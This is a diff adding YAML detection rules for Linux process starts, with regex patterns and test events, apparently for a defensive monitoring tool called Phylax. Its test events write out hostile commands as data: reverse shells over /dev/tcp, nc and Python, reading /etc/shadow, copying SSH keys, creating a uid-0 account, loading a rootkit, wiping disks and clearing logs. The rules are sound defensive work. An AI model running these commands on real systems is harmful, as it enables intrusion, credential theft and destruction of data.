@@ -1,0 +1,469 @@
+# Linux exec rules (producer: internal/collect/audit process_start). Fields:
+# comm, cmdline, image (= exe), argc, uid, cgroup, parent.{exe,comm,cmdline}.
+# Exec rules take the plan tag exemption so our own hardening (chattr +i,
+# useradd, auditctl, iptables) is silent; an operator typing the same command
+# costs one click at tier 1.
+id: D1.service-spawns-shell
+title: Scored service process spawned a shell or tool outside its learned children
+severity: high
+tier: 1
+mode: act
+attack: [T1505.003, T1059]
+collect: [process_tree, content_changes, transactions_window_10m, freeze_ring]
+ir_template: web-app-compromise
+exempt_tagged: true
+entities: [parent.comm, image]
+message: "{parent.comm} spawned {image}: {cmdline}"
+when:
+  event: process_start
+  all:
+    - parent.comm: {in_profile: scored.service_comms}
+    - not: {image: {in_profile: svc.children}}
+    - image: {endswith_any: [/sh, /bash, /dash, /zsh, /ash, /busybox, /python3, /python, /perl, /nc, /ncat, /socat, /curl, /wget]}
+tests:
+  - name: shell under a scored service
+    should_match: true
+    seed: {scored.service_comms: [apache2], svc.children: {apache2: [/usr/bin/convert]}}
+    event: {kind: process_start, fields: {image: /bin/sh, cmdline: "sh -c id", parent: {comm: apache2}}}
+  - name: parent flat field from the exec feed
+    should_match: true
+    seed: {scored.service_comms: [apache2], svc.children: {apache2: [/usr/bin/convert]}}
+    event: {kind: process_start, fields: {exe: /usr/bin/python3, pcomm: apache2}}
+  - name: parent is not a scored service
+    should_match: false
+    seed: {scored.service_comms: [apache2]}
+    event: {kind: process_start, fields: {image: /bin/bash, parent: {comm: sshd}}}
+  - name: tagged plan step
+    should_match: false
+    seed: {scored.service_comms: [apache2], svc.children: {apache2: [/usr/bin/convert]}}
+    event: {kind: process_start, fields: {image: /bin/sh, parent: {comm: apache2}, tag: "plan:p9"}}
+---
+id: D3e.pwnkit-exec
+title: pkexec executed with no arguments by a non-root user
+severity: critical
+tier: 1
+attack: [T1068]
+collect: [process_tree]
+when:
+  event: process_start
+  all:
+    - comm: pkexec
+    - uid: {gt: 0}
+    - argc: 0
+tests:
+  - {name: pwnkit shape, should_match: true, event: {kind: process_start, fields: {comm: pkexec, uid: 1000, argc: 0, cmdline: ""}}}
+  - {name: normal pkexec, should_match: false, event: {kind: process_start, fields: {comm: pkexec, uid: 1000, argc: 2, cmdline: "pkexec ls"}}}
+  - {name: root, should_match: false, event: {kind: process_start, fields: {comm: pkexec, uid: 0, argc: 0}}}
+---
+id: D15b.cred-file-access
+title: Credential-harvesting command against a well-known secret file
+severity: medium
+tier: 1
+attack: [T1552.001, T1552.004]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: [cat, less, more, head, tail, grep, egrep, fgrep, strings, cp, scp, tar, zip, base64, xxd, find, locate]
+    - cmdline: {re: '(?i)(id_(rsa|dsa|ecdsa|ed25519)|\.kdbx|passlist|cc_data|wp-config|\.pgpass|\.my\.cnf|\.git-credentials|\.aws/credentials|/etc/shadow|\.env(\s|$))'}
+tests:
+  - {name: cat shadow, should_match: true, event: {kind: process_start, fields: {comm: cat, cmdline: "cat /etc/shadow"}}}
+  - {name: scp private key, should_match: true, event: {kind: process_start, fields: {comm: scp, cmdline: "scp /root/.ssh/id_rsa x@y:"}}}
+  - {name: ssh -i is not a read, should_match: false, event: {kind: process_start, fields: {comm: ssh, cmdline: "ssh -i /root/.ssh/id_rsa x@y"}}}
+  - {name: cat of a log, should_match: false, event: {kind: process_start, fields: {comm: cat, cmdline: "cat /var/log/syslog"}}}
+---
+id: D9b.ssh-peer-push
+title: ssh/scp client started on a server toward another host
+severity: medium
+tier: 1
+attack: [T1021.004, T1570]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: [ssh, scp, sftp, sshpass, rsync]
+    - cmdline: {re: '\S+@[0-9A-Za-z.:-]+'}
+    - not: {cgroup: {re: '(ansible|phylax)'}}
+tests:
+  - {name: scp to peer, should_match: true, event: {kind: process_start, fields: {comm: scp, cmdline: "scp a.txt root@10.0.0.5:/tmp", cgroup: "/user.slice/session-2.scope"}}}
+  - {name: our own unit, should_match: false, event: {kind: process_start, fields: {comm: ssh, cmdline: "ssh phylax@10.0.0.2 true", cgroup: "/system.slice/phylax.service"}}}
+  - {name: local ssh-keygen, should_match: false, event: {kind: process_start, fields: {comm: ssh-keygen, cmdline: "ssh-keygen -t ed25519"}}}
+---
+id: D7d.uid0-account-cmd
+title: Account utility invoked with an explicit uid of 0
+severity: critical
+tier: 1
+attack: [T1136.001, T1098]
+collect: [process_tree, content_changes]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: [useradd, usermod, adduser, newusers]
+    - cmdline: {re: '(^|\s)(-u|--uid)[ =]0(\s|$)'}
+tests:
+  - {name: second root, should_match: true, event: {kind: process_start, fields: {comm: useradd, cmdline: "useradd -o -u 0 toor"}}}
+  - {name: normal uid, should_match: false, event: {kind: process_start, fields: {comm: useradd, cmdline: "useradd -u 1001 bob"}}}
+  - {name: uid 0x prefix is not 0, should_match: false, event: {kind: process_start, fields: {comm: useradd, cmdline: "useradd -u 1000 bob"}}}
+---
+id: D7f.priv-group-add-cmd
+title: User added to a privileged group by command line
+severity: high
+tier: 1
+attack: [T1098, T1548.003]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: [usermod, gpasswd, adduser, useradd]
+    - cmdline: {re: '(-[a-zA-Z]*G|--groups|gpasswd|adduser)'}
+    - cmdline: {re: '(?i)\b(sudo|wheel|root|adm|docker|lxd|disk|shadow|admin)\b'}
+tests:
+  - {name: usermod sudo, should_match: true, event: {kind: process_start, fields: {comm: usermod, cmdline: "usermod -aG sudo bob"}}}
+  - {name: gpasswd wheel, should_match: true, event: {kind: process_start, fields: {comm: gpasswd, cmdline: "gpasswd -a bob wheel"}}}
+  - {name: plain group, should_match: false, event: {kind: process_start, fields: {comm: usermod, cmdline: "usermod -aG video bob"}}}
+---
+id: D6c.pkg-hold
+title: Package hold or versionlock command
+severity: high
+tier: 1
+attack: [T1556.003, T1685]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  any:
+    - all:
+        - comm: apt-mark
+        - cmdline: {re: '\bhold\b'}
+    - all:
+        - comm: dpkg
+        - cmdline: {re: '--set-selections'}
+    - all:
+        - comm: [dnf, yum, dnf-3]
+        - cmdline: {re: 'versionlock\s+(add|exclude)'}
+tests:
+  - {name: apt-mark hold, should_match: true, event: {kind: process_start, fields: {comm: apt-mark, cmdline: "apt-mark hold libpam-modules"}}}
+  - {name: dnf versionlock, should_match: true, event: {kind: process_start, fields: {comm: dnf, cmdline: "dnf versionlock add pam"}}}
+  - {name: apt-mark showhold is a read, should_match: false, event: {kind: process_start, fields: {comm: apt-mark, cmdline: "apt-mark showmanual"}}}
+---
+id: D1e.sshd-child-interpreter
+title: Interpreter or network tool whose parent is sshd
+severity: high
+tier: 1
+attack: [T1556.003, T1098.004]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - parent.comm: sshd
+    - comm: {re: '^(python[0-9.]*|perl|ruby|php|node|nc|ncat|socat|curl|wget)$'}
+tests:
+  - {name: python from sshd (PAM hook shape), should_match: true, event: {kind: process_start, fields: {comm: python3, pcomm: sshd}}}
+  - {name: nested parent field, should_match: true, event: {kind: process_start, fields: {comm: curl, parent: {comm: sshd}}}}
+  - {name: bash login shell is normal, should_match: false, event: {kind: process_start, fields: {comm: bash, pcomm: sshd}}}
+  - {name: python from cron, should_match: false, event: {kind: process_start, fields: {comm: python3, pcomm: cron}}}
+---
+id: D5c.setcap
+title: setcap granting a powerful capability
+severity: high
+tier: 1
+attack: [T1548, T1098]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: setcap
+    - cmdline: {re: '(?i)cap_(setuid|setgid|dac_override|dac_read_search|sys_admin|sys_ptrace|sys_module|chown|fowner|net_admin)'}
+tests:
+  - {name: cap_setuid on python, should_match: true, event: {kind: process_start, fields: {comm: setcap, cmdline: "setcap cap_setuid+ep /usr/bin/python3"}}}
+  - {name: harmless bind cap, should_match: false, event: {kind: process_start, fields: {comm: setcap, cmdline: "setcap cap_net_bind_service+ep /usr/bin/x"}}}
+---
+id: D6n.sched-exec
+title: at/batch, crontab edit or systemd transient timer
+severity: medium
+tier: 1
+attack: [T1053.003, T1053.002, T1053.006]
+collect: [process_tree, content_changes]
+exempt_tagged: true
+when:
+  event: process_start
+  any:
+    - comm: [at, batch]
+    - all:
+        - comm: crontab
+        - cmdline: {re: '(\s-e(\s|$)|\s-u\s|\s[^-\s]\S*$)'}
+    - all:
+        - comm: systemd-run
+        - cmdline: {re: '--on-(calendar|active|boot|startup|unit-active)'}
+tests:
+  - {name: crontab -e, should_match: true, event: {kind: process_start, fields: {comm: crontab, cmdline: "crontab -e"}}}
+  - {name: at, should_match: true, event: {kind: process_start, fields: {comm: at, cmdline: "at now"}}}
+  - {name: crontab -l is a read, should_match: false, event: {kind: process_start, fields: {comm: crontab, cmdline: "crontab -l"}}}
+---
+id: D11b.kmod-load
+title: Kernel module loaded by command
+severity: high
+tier: 1
+attack: [T1547.006, T1014]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: [insmod, modprobe, rmmod, kmod, depmod]
+    - not: {cmdline: {re: '(nf_tables|nft_|xt_|nf_conntrack|br_netfilter|overlay|veth|vxlan|dm_|loop)'}}
+tests:
+  - {name: insmod rootkit, should_match: true, event: {kind: process_start, fields: {comm: insmod, cmdline: "insmod /tmp/diamorphine.ko"}}}
+  - {name: docker's overlay, should_match: false, event: {kind: process_start, fields: {comm: modprobe, cmdline: "modprobe overlay"}}}
+---
+id: D5g.suid-set
+title: chmod setting the setuid/setgid bit
+severity: medium
+tier: 1
+attack: [T1548.001]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: chmod
+    - cmdline: {re: '(^|\s)([ugoa]*\+[rwxXt]*s|[2467][0-7]{3})(\s|$)'}
+tests:
+  - {name: chmod u+s, should_match: true, event: {kind: process_start, fields: {comm: chmod, cmdline: "chmod u+s /bin/bash"}}}
+  - {name: chmod 4755, should_match: true, event: {kind: process_start, fields: {comm: chmod, cmdline: "chmod 4755 /tmp/x"}}}
+  - {name: chmod 755, should_match: false, event: {kind: process_start, fields: {comm: chmod, cmdline: "chmod 755 /tmp/x"}}}
+---
+id: D6f.immutable-flag
+title: chattr sets or clears the immutable/append-only attribute outside a plan
+description: Both directions (Sigma only detects removal). Our hardening runs chattr +i under a plan tag and is exempt.
+severity: medium
+tier: 1
+attack: [T1222.002, T1070.004]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: chattr
+    - cmdline: {re: '(^|\s)[-+=][a-zA-Z]*[ia]'}
+tests:
+  - {name: attacker sets +i on authorized_keys, should_match: true, event: {kind: process_start, fields: {comm: chattr, cmdline: "chattr +i /root/.ssh/authorized_keys"}}}
+  - {name: attacker clears -i, should_match: true, event: {kind: process_start, fields: {comm: chattr, cmdline: "chattr -i /etc/passwd"}}}
+  - {name: our hardening is tagged, should_match: false, event: {kind: process_start, fields: {comm: chattr, cmdline: "chattr +i /etc/passwd /etc/shadow", tag: "plan:harden-linux"}}}
+  - {name: lsattr, should_match: false, event: {kind: process_start, fields: {comm: lsattr, cmdline: "lsattr /etc/passwd"}}}
+---
+id: D3c.remote-access-inventory
+title: Remote-access or tunnelling tool started
+severity: high
+tier: 1
+attack: [T1219, T1572, T1090]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: {re: '(?i)^(tailscaled?|ngrok|chisel|frpc?|frps|ligolo.*|cloudflared|zerotier-one|rathole|wstunnel|sshuttle|bore|teamviewerd?|anydesk|rustdesk|x11vnc|Xtigervnc|Xvnc|vncserver|socat|ncat)$'}
+tests:
+  - {name: chisel, should_match: true, event: {kind: process_start, fields: {comm: chisel}}}
+  - {name: socat, should_match: true, event: {kind: process_start, fields: {comm: socat}}}
+  - {name: bash, should_match: false, event: {kind: process_start, fields: {comm: bash}}}
+---
+id: D1f.web-server-child
+title: Web-server unit started a shell, recon utility or download tool
+severity: high
+tier: 1
+attack: [T1505.003, T1059.004]
+collect: [process_tree, content_changes, transactions_window_10m, freeze_ring]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - cgroup: {re: '(?i)(apache2?|httpd|nginx|lighttpd|php[0-9.]*-fpm|tomcat)'}
+    - comm: [sh, bash, dash, zsh, ash, busybox, python, python2, python3, perl, ruby, nc, ncat, socat, curl, wget, whoami, id, uname, ifconfig, ip, netstat, ss, hostname, crontab, iptables, base64, mkfifo]
+tests:
+  - {name: whoami under apache, should_match: true, event: {kind: process_start, fields: {comm: whoami, cgroup: /system.slice/apache2.service}}}
+  - {name: php-fpm spawns sh, should_match: true, event: {kind: process_start, fields: {comm: sh, cgroup: /system.slice/php8.1-fpm.service}}}
+  - {name: apache2ctl in same unit is not a shell tool, should_match: false, event: {kind: process_start, fields: {comm: apache2, cgroup: /system.slice/apache2.service}}}
+  - {name: shell in ssh session, should_match: false, event: {kind: process_start, fields: {comm: bash, cgroup: /user.slice/session-1.scope}}}
+---
+id: D17c.service-stop
+title: Stop, disable, mask or kill of a scored service
+severity: medium
+tier: 1
+attack: [T1489, T1685]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: [systemctl, service, kill, killall, pkill]
+    - cmdline: {re: '(?i)(stop|disable|mask|unmask|kill|-9)\s.*(\b(apache2|httpd|nginx|php[0-9.]*-fpm|postfix|dovecot|mysql(d)?|mariadb(d)?|named|bind9|vsftpd|proftpd|smb(d)?|splunk(d)?|wazuh-agent|auditd|rsyslog)\b|\bsshd?(\.service)?(\s|$))'}
+tests:
+  - {name: stop apache, should_match: true, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl stop apache2"}}}
+  - {name: mask sshd, should_match: true, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl mask sshd.service"}}}
+  - {name: status is a read, should_match: false, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl status apache2"}}}
+  - {name: plan restart is tagged, should_match: false, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl stop nginx", tag: "plan:p3"}}}
+---
+id: D17d.destructive-cmd
+title: Bulk delete, wipe or destructive SQL from a shell
+severity: high
+tier: 1
+attack: [T1485, T1561, T1490]
+collect: [process_tree, content_changes]
+exempt_tagged: true
+when:
+  event: process_start
+  any:
+    - all:
+        - comm: [rm, shred, unlink, wipe]
+        - cmdline: {re: '(-[a-zA-Z]*[rR]|--recursive|--no-preserve-root).*(/var/www|/srv|/etc/(postfix|dovecot|bind|mysql)|/var/lib/(mysql|pgsql|postgresql))'}
+    - all:
+        - comm: [mysql, mariadb, psql, mysqladmin]
+        - cmdline: {re: '(?i)(drop\s+(database|table|schema)|truncate\s+table|delete\s+from\s+\S*(user|product|order|customer|admin|employee))'}
+    - all:
+        - comm: [dd, truncate]
+        - cmdline: {re: '(of=/dev/(sd|nvme|vd|xvd)|--size[= ]0|-s ?0\s)'}
+tests:
+  - {name: rm -rf webroot, should_match: true, event: {kind: process_start, fields: {comm: rm, cmdline: "rm -rf /var/www/html"}}}
+  - {name: drop database, should_match: true, event: {kind: process_start, fields: {comm: mysql, cmdline: "mysql -e DROP DATABASE shop"}}}
+  - {name: dd to disk, should_match: true, event: {kind: process_start, fields: {comm: dd, cmdline: "dd if=/dev/zero of=/dev/sda"}}}
+  - {name: rm tmp, should_match: false, event: {kind: process_start, fields: {comm: rm, cmdline: "rm -rf /tmp/build"}}}
+---
+id: D10k.fw-exec-tamper
+title: Linux host firewall flushed, disabled or default policy changed by command
+severity: high
+tier: 1
+attack: [T1686]
+collect: [process_tree, content_changes]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: [iptables, ip6tables, nft, ufw, firewall-cmd, iptables-save, iptables-restore]
+    - cmdline: {re: '(\s-F(\s|$)|--flush|flush\s+ruleset|\sdisable(\s|$)|--panic-on|-P\s+(INPUT|OUTPUT|FORWARD)\s+(ACCEPT|DROP|REJECT)|-I\s+INPUT.*-j\s+(DROP|REJECT)|delete\s+(rule|table|chain))'}
+tests:
+  - {name: iptables -F, should_match: true, event: {kind: process_start, fields: {comm: iptables, cmdline: "iptables -F"}}}
+  - {name: ufw disable, should_match: true, event: {kind: process_start, fields: {comm: ufw, cmdline: "ufw disable"}}}
+  - {name: our restore is tagged, should_match: false, event: {kind: process_start, fields: {comm: iptables, cmdline: "iptables -F", tag: "restore:firewall"}}}
+  - {name: listing rules, should_match: false, event: {kind: process_start, fields: {comm: iptables, cmdline: "iptables -L -n"}}}
+---
+id: D5e3.kthread-masquerade
+title: User-space process pretending to be a kernel thread
+severity: high
+tier: 1
+attack: [T1036.004, T1014]
+collect: [process_tree]
+when:
+  event: process_start
+  all:
+    - cmdline: {re: '^\[(kworker|kthreadd|ksoftirqd|migration|rcu_[a-z]+|watchdog|kswapd)[^\]]*\]'}
+    - image: {present: true}
+tests:
+  - {name: fake kworker, should_match: true, event: {kind: process_start, fields: {cmdline: "[kworker/0:1]", image: /tmp/.x/miner}}}
+  - {name: normal process, should_match: false, event: {kind: process_start, fields: {cmdline: "/usr/sbin/sshd -D", image: /usr/sbin/sshd}}}
+---
+id: D13b2.revshell-cmd
+title: Reverse-shell command shape
+severity: critical
+tier: 1
+attack: [T1059.004, T1095, T1571]
+collect: [process_tree, freeze_ring]
+exempt_tagged: true
+when:
+  event: process_start
+  any:
+    - all:
+        - comm: [bash, sh, dash, zsh]
+        - cmdline: {re: '(-i\s*>&?\s*/dev/(tcp|udp)/|/dev/(tcp|udp)/[0-9.]+/[0-9]+|exec\s+[0-9]+<>/dev/tcp)'}
+    - all:
+        - comm: [nc, ncat, netcat, socat]
+        - cmdline: {re: '(\s-[a-z]*[ec]\s+/bin/(ba)?sh|\sexec:|\sEXEC:|\ssystem:)'}
+    - all:
+        - comm: {re: '^(python[0-9.]*|perl|ruby|php)$'}
+        - cmdline: {re: '(?i)(socket.*(connect|SOCK_STREAM).*(sh|pty|dup2)|pty\.spawn|fsockopen.*(sh|exec)|TCPSocket.*(sh|exec))'}
+tests:
+  - {name: bash /dev/tcp, should_match: true, event: {kind: process_start, fields: {comm: bash, cmdline: "bash -i >& /dev/tcp/10.1.1.1/4444 0>&1"}}}
+  - {name: nc -e, should_match: true, event: {kind: process_start, fields: {comm: nc, cmdline: "nc -e /bin/sh 10.1.1.1 4444"}}}
+  - {name: python pty.spawn, should_match: true, event: {kind: process_start, fields: {comm: python3, cmdline: "python3 -c import socket,pty;s=socket.socket();s.connect(('1.1.1.1',1));pty.spawn('sh')"}}}
+  - {name: plain bash script, should_match: false, event: {kind: process_start, fields: {comm: bash, cmdline: "bash /usr/local/bin/backup.sh"}}}
+---
+id: D10g.log-clear-exec
+title: Command that clears logs, shell history or audit rules
+severity: high
+tier: 1
+attack: [T1685.006, T1070.003, T1070.004, T1685]
+collect: [process_tree, content_changes]
+exempt_tagged: true
+when:
+  event: process_start
+  any:
+    - all:
+        - comm: [truncate, shred, rm, unlink, cp, mv]
+        - cmdline: {re: '/var/log/(auth\.log|secure|syslog|messages|wtmp|btmp|lastlog|audit/audit\.log|kern\.log|apache2|httpd|nginx|mail\.log|maillog|journal)'}
+    - all:
+        - comm: journalctl
+        - cmdline: {re: '--(vacuum-(time|size|files)|rotate)'}
+    - all:
+        - comm: [history, bash, sh, ln, export, unset]
+        - cmdline: {re: '(history\s+-[cw]|unset\s+HISTFILE|HISTFILE=/dev/null|HISTSIZE=0|ln\s+-s[f]?\s+/dev/null\s+\S*history)'}
+    - all:
+        - comm: auditctl
+        - cmdline: {re: '(\s-D(\s|$)|\s-e\s*0)'}
+tests:
+  - {name: truncate auth.log, should_match: true, event: {kind: process_start, fields: {comm: truncate, cmdline: "truncate -s 0 /var/log/auth.log"}}}
+  - {name: auditctl -D, should_match: true, event: {kind: process_start, fields: {comm: auditctl, cmdline: "auditctl -D"}}}
+  - {name: auditctl -D by our plan, should_match: false, event: {kind: process_start, fields: {comm: auditctl, cmdline: "auditctl -D", tag: "plan:audit-reload"}}}
+  - {name: auditctl -l, should_match: false, event: {kind: process_start, fields: {comm: auditctl, cmdline: "auditctl -l"}}}
+---
+id: D10j.timestomp
+title: touch used to set explicit timestamps
+severity: low
+tier: 1
+attack: [T1070.006]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: touch
+    - cmdline: {re: '(^|\s)(-[a-zA-Z]*[tdr]\b|--(date|reference)[ =])'}
+tests:
+  - {name: touch -r, should_match: true, event: {kind: process_start, fields: {comm: touch, cmdline: "touch -r /bin/ls /tmp/x.php"}}}
+  - {name: plain touch, should_match: false, event: {kind: process_start, fields: {comm: touch, cmdline: "touch /tmp/x"}}}
+---
+id: D10h.monitor-stop
+title: Stop, disable or kill of a monitoring, logging or Phylax service
+severity: high
+tier: 1
+attack: [T1685, T1489]
+collect: [process_tree]
+exempt_tagged: true
+when:
+  event: process_start
+  all:
+    - comm: [systemctl, service, kill, killall, pkill, sc.exe, net.exe, net1.exe, taskkill.exe]
+    - cmdline: {re: '(?i)(stop|disable|mask|kill|-9|-15|delete|/f)\b.*\b(auditd|rsyslog(d)?|syslog-ng|journald|wazuh(-agent)?|ossec|splunk(d|forwarder)?|falco|osqueryd|sysmon(64)?|phylax|WinDefend|MpsSvc|EventLog|Sense)\b'}
+tests:
+  - {name: stop auditd, should_match: true, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl stop auditd"}}}
+  - {name: sc stop sysmon, should_match: true, event: {kind: process_start, fields: {comm: sc.exe, cmdline: "sc.exe stop Sysmon64"}}}
+  - {name: restart is not stop, should_match: false, event: {kind: process_start, fields: {comm: systemctl, cmdline: "systemctl status auditd"}}}
+---
+id: D5a.memfd-or-deleted-exec
+title: Process executed from memfd or a deleted file
+severity: high
+tier: 1
+attack: [T1620, T1055]
+collect: [process_tree, memory_artifacts]
+when:
+  event: process_start
+  all:
+    - image: {re: '^/memfd:|\(deleted\)$'}
+tests:
+  - {name: memfd exec, should_match: true, event: {kind: process_start, fields: {image: "/memfd:x (deleted)", comm: x}}}
+  - {name: normal binary, should_match: false, event: {kind: process_start, fields: {image: /usr/bin/ls}}}
